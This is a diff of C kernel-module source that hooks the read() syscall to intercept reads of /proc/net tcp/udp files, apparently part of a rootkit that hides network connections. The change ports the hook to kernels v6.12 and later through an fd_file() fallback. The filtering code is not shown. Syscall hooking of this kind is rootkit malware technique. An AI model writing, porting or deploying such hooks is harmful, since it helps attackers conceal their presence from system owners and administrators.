@@ -178,7 +178,7 @@ static unsigned long get_proc_inode(const char *path) {
 }
 
 /* ================================================================
- * Hooked read() — intercept reads to /proc/net/* files
+ * Hooked read() — intercept reads to procfs net files (tcp/udp)
  * ================================================================ */
 asmlinkage long hooked_read(const struct pt_regs *regs) {
     long (*orig_read)(const struct pt_regs *);
@@ -188,13 +188,21 @@ asmlinkage long hooked_read(const struct pt_regs *regs) {
     char *kbuf = NULL;
     unsigned long ino = 0;
     struct fd f;
+    struct file *file;
 
     orig_read = (void *)hooks[HOOKIDX_READ].original;
 
-    /* Check if this fd is a /proc/net file we care about */
+    /* Check if this fd is a /proc/net file we care about.
+     * Since v6.12 `struct fd` hides its member behind the fd_file()
+     * accessor — use it when available, fall back to f.file. */
     f = fdget(fd);
-    if (f.file) {
-        struct inode *inode = f.file->f_inode;
+#if defined(fd_file)
+    file = fd_file(f);
+#else
+    file = f.file;
+#endif
+    if (file) {
+        struct inode *inode = file->f_inode;
         if (inode)
             ino = inode->i_ino;
     }
